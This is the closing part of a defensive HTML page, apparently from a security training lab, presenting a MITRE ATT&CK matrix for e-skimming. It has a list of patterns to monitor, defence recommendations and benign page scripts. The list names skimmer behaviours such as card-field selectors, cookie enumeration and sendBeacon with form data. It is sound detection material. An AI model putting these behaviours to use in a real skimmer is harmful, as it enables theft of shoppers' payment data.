              <li>Environment fingerprinting (WebGL queries)</li>
              <li>Fetch/XHR to non-payment-processor domains</li>
            </ul>
          </div>
        </div>

        <div class="alert alert-danger" style="margin-top: 30px">
          <strong>High-Risk Patterns to Monitor:</strong><br />
          ‚Ä¢ <code>querySelector('[name*="card"]')</code> in unknown scripts<br />
          ‚Ä¢ <code>document.cookie</code> enumeration on checkout pages<br />
          ‚Ä¢ <code>new WebSocket()</code> on payment forms<br />
          ‚Ä¢ <code>navigator.sendBeacon()</code> with form data<br />
          ‚Ä¢ Multiple encoding layers (Base64 + hex + custom)
        </div>
      </section>

      <!-- Recommendations -->
      <section>
        <div class="section-header">
          <div class="section-icon">üí°</div>
          <h2>Recommendations</h2>
        </div>

        <div class="alert alert-success">
          <h4>For E-Commerce Platforms</h4>
          <ul>
            <li>
              <strong>Defense in Depth:</strong> CSP + SRI + FIM + Network Monitoring (no single
              control is sufficient)
            </li>
            <li>
              <strong>Enforce MFA:</strong> All admin accounts require multi-factor authentication
            </li>
            <li>
              <strong>Third-Party Risk:</strong> Vendor assessments, SRI for external scripts,
              regular audits
            </li>
            <li>
              <strong>Continuous Monitoring:</strong> Real-time FIM alerts, network anomaly
              detection, checkout page monitoring
            </li>
            <li>
              <strong>Incident Response:</strong> Documented procedures, regular drills, forensic
              readiness
            </li>
          </ul>
        </div>

        <div class="alert alert-info">
          <h4>For Security Teams</h4>
          <ul>
            <li>
              <strong>Threat Hunting:</strong> Regular code reviews, network traffic baselining,
              event listener inventory
            </li>
            <li>
              <strong>Detection Engineering:</strong> Custom Semgrep rules, Suricata signatures,
              behavioral monitoring
            </li>
            <li>
              <strong>Training:</strong> Developer secure coding, incident response drills,
              e-skimming TTP education
            </li>
          </ul>
        </div>
      </section>
    </div>

    <!-- Scroll to Top Button -->
    <div class="scroll-top" id="scrollTop"></div>

    <!-- Footer -->
    <footer>
      <p>MITRE ATT&CK Matrix for E-Skimming Attacks | Version 2.0 | Last Updated: 2025-10-21</p>
      <p style="margin-top: 8px">
        Based on extensive research and analysis of real-world e-skimming campaigns (2018-2025)
      </p>
    </footer>

    <script>
      // Wait for DOM to be fully loaded
      document.addEventListener('DOMContentLoaded', function () {
        // Environment-aware back button URL
        function setBackButtonUrl() {
          const backBtn = document.getElementById('back-btn')
          if (!backBtn) {
            console.warn('Back button not found')
            return
          }

          const hostname = window.location.hostname
          const port = window.location.port
          const protocol = window.location.protocol

          // Determine base URL based on environment (consistent with lab pages)
          let backUrl
          if (hostname === 'localhost' || hostname === '127.0.0.1') {
            // Local development - use port 8080 (Traefik)
            backUrl = 'http://localhost:8080'
          } else if (hostname.includes('stg.pcioasis.com') || hostname.includes('staging')) {
            // Staging environment
            backUrl = 'https://labs.stg.pcioasis.com'
          } else if (hostname.includes('pcioasis.com') && !hostname.includes('stg')) {
            // Production environment
            backUrl = 'https://labs.pcioasis.com'
          } else {
            // Fallback: use current origin
            backUrl = window.location.origin
          }

          backBtn.href = backUrl
          console.log('Back button URL set to:', backUrl)
        }

        // Set back button URL on page load
        setBackButtonUrl()

        // Smooth scrolling for navigation
        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
          anchor.addEventListener('click', function (e) {
            e.preventDefault()
            const target = document.querySelector(this.getAttribute('href'))
            if (target) {
              target.scrollIntoView({ behavior: 'smooth', block: 'start' })
            }
          })
        })

        // Active nav button on scroll
        const sections = document.querySelectorAll('section[id]')
        const navBtns = document.querySelectorAll('.nav-btn')

        window.addEventListener('scroll', () => {
          let current = ''
          sections.forEach(section => {
            const sectionTop = section.offsetTop
            const sectionHeight = section.clientHeight
            if (pageYOffset >= sectionTop - 200) {
              current = section.getAttribute('id')
            }
          })

          navBtns.forEach(btn => {
            btn.classList.remove('active')
            if (btn.getAttribute('href') === `#${current}`) {
              btn.classList.add('active')
            }
          })
        })

        // Scroll to top button
        const scrollTop = document.getElementById('scrollTop')
        window.addEventListener('scroll', () => {
          if (window.pageYOffset > 300) {
            scrollTop.classList.add('visible')
          } else {
            scrollTop.classList.remove('visible')
          }
        })

        scrollTop.addEventListener('click', () => {
          window.scrollTo({ top: 0, behavior: 'smooth' })
        })

        // Expandable sections
        document.querySelectorAll('.expandable-header').forEach(header => {
          header.addEventListener('click', function () {
            const expandable = this.parentElement
            expandable.classList.toggle('open')
          })
        })

        // Fade in animations on scroll
        const observerOptions = {
          threshold: 0.1,
          rootMargin: '0px 0px -100px 0px'
        }

        const observer = new IntersectionObserver(entries => {
          entries.forEach(entry => {
            if (entry.isIntersecting) {
              entry.target.classList.add('fade-in-up')
            }
          })
        }, observerOptions)

        document.querySelectorAll('.card, .timeline-item').forEach(el => {
          observer.observe(el)
        })
      }) // End of DOMContentLoaded
    </script>

    <!-- Private Data Loader Plugin -->
    <script src="private-data-loader.js"></script>
    <script>
      /**
       * Private Data Integration for MITRE ATT&CK Matrix
       *
       * This integration allows private attack data to be dynamically loaded
       * and merged into the public MITRE matrix without hardcoding.
       *
       * Default behavior (no private repo):
       * - Shows only public attacks
       * - No errors or warnings
       * - Full functionality preserved
       *
       * With private repo (cloned in parallel):
       * - Automatically loads attacks-index.json
       * - Adds private techniques to matrix
       * - Shows status badges (üî¥ Observed, üü° Emerging, üîµ Lab)
       */

      // Listen for private data loaded event
      window.addEventListener('privateDataLoaded', event => {
        console.log('[MITRE Matrix] Private data loaded, enriching matrix...')

        const { attacks } = event.detail

        if (!attacks || attacks.length === 0) {
          console.log('[MITRE Matrix] No private attacks to add')
          return
        }

        console.log(`[MITRE Matrix] Adding ${attacks.length} private attack(s) to matrix`)

        // For each private attack, add its techniques to the appropriate tactic columns
        attacks.forEach(attack => {
          attack.mitreTechniques.forEach(technique => {
            // Find which tactic this technique belongs to
            const tacticId = getTacticForTechnique(technique.id, attack.mitreTactics)

            if (tacticId) {
              addPrivateTechniqueToMatrix(tacticId, technique, attack)
            }
          })
        })

        console.log('[MITRE Matrix] Private data integration complete')
      })

      /**
       * Map technique ID to tactic column
       */
      function getTacticForTechnique(techniqueId, attackTactics) {
        // Mapping of technique base IDs to tactic IDs
        const techniqueToTacticMap = {
          T1195: 'TA0001', // Initial Access
          T1059: 'TA0002', // Execution
          T1554: 'TA0003', // Persistence
          T1068: 'TA0004', // Privilege Escalation
          T1027: 'TA0005', // Defense Evasion
          T1003: 'TA0006', // Credential Access
          T1083: 'TA0007', // Discovery
          T1056: 'TA0009', // Collection
          T1071: 'TA0011', // Command and Control
          T1041: 'TA0010', // Exfiltration
          T1491: 'TA0040', // Impact
          T1496: 'TA0040', // Impact
          T1657: 'TA0040', // Impact
          'CUSTOM-WASM-001': 'TA0002' // Execution (custom technique)
        }

        const baseId = techniqueId.split('.')[0]
        return techniqueToTacticMap[baseId] || attackTactics[0] // Fallback to first tactic
      }

      /**
       * Add a private technique to the matrix DOM
       */
      function addPrivateTechniqueToMatrix(tacticId, technique, attack) {
        // Map tactic IDs to column indices (0-based)
        const tacticToColumnIndex = {
          TA0001: 0, // Initial Access
          TA0002: 1, // Execution
          TA0003: 2, // Persistence
          TA0004: 3, // Privilege Escalation
          TA0005: 4, // Defense Evasion
          TA0006: 5, // Credential Access
          TA0007: 6, // Discovery
          TA0008: 7, // Lateral Movement
          TA0009: 8, // Collection
          TA0011: 9, // Command and Control
          TA0010: 10, // Exfiltration
          TA0040: 11 // Impact
        }

        const columnIndex = tacticToColumnIndex[tacticId]
        if (columnIndex === undefined) {
          console.warn(`[MITRE Matrix] Unknown tactic ID: ${tacticId}`)
          return
        }

        // Find the tactic cell (tbody > tr > td)
        const tacticCells = document.querySelectorAll('.attack-matrix tbody tr td.tactic-cell')
        const targetCell = tacticCells[columnIndex]

        if (!targetCell) {
          console.warn(`[MITRE Matrix] Could not find tactic cell for column ${columnIndex}`)
          return
        }

        // Get status badge HTML
        const statusBadge = getStatusBadgeHTML(technique.status || attack.status)

        // Create technique item HTML
        const techniqueHTML = `
                <div class="technique-item" data-private="true">
                    <a href="#${technique.id.toLowerCase()}" class="technique-link">${technique.id}</a>
                    ${statusBadge}
                    <span class="technique-name">${technique.name}</span>
                </div>
            `

        // Check if there's a "no techniques" message to replace
        const noTechniquesDiv = targetCell.querySelector('.no-techniques')
        if (noTechniquesDiv) {
          noTechniquesDiv.remove()
        }

        // Append the new technique
        targetCell.insertAdjacentHTML('beforeend', techniqueHTML)

        // Update technique count in header
        updateTechniqueCount(columnIndex)
      }

      /**
       * Get HTML for status badge
       */
      function getStatusBadgeHTML(status) {
        const badges = {
          observed: '<span class="status-badge observed">üî¥ Observed</span>',
          emerging: '<span class="status-badge emerging">üü° Emerging</span>',
          'theoretical-emerging': '<span class="status-badge emerging">üü° Emerging</span>',
          lab: '<span class="status-badge lab">üîµ Lab</span>'
        }
        return badges[status] || badges['lab']
      }

      /**
       * Update technique count in column header
       */
      function updateTechniqueCount(columnIndex) {
        const tacticCells = document.querySelectorAll('.attack-matrix tbody tr td.tactic-cell')
        const targetCell = tacticCells[columnIndex]
        const techniqueCount = targetCell.querySelectorAll('.technique-item').length

        // Find corresponding count cell in header
        const countCells = document.querySelectorAll('.attack-matrix .technique-count td')
        const countCell = countCells[columnIndex]

        if (countCell) {
          countCell.textContent = `${techniqueCount} technique${techniqueCount !== 1 ? 's' : ''}`
        }
      }

      // Initialize private data loader in local mode
      // This will attempt to load from ../private-e-skimming-attacks/
      // If the repo doesn't exist, it silently continues without errors
      if (typeof PrivateDataLoader !== 'undefined') {
        PrivateDataLoader.init({
          localMode: true // Use local JSON files during development
        })
          .then(success => {
            if (success) {
              console.log('[MITRE Matrix] Private data loader initialized successfully')
            } else {
              console.log(
                "[MITRE Matrix] Private data not available (this is normal if you don't have the private repo)"
              )
            }
          })
          .catch(error => {
            console.log('[MITRE Matrix] Private data loader not available:', error.message)
          })
      } else {
        console.log('[MITRE Matrix] Running in public-only mode (private-data-loader.js not found)')
      }
    </script>
  </body>
</html>
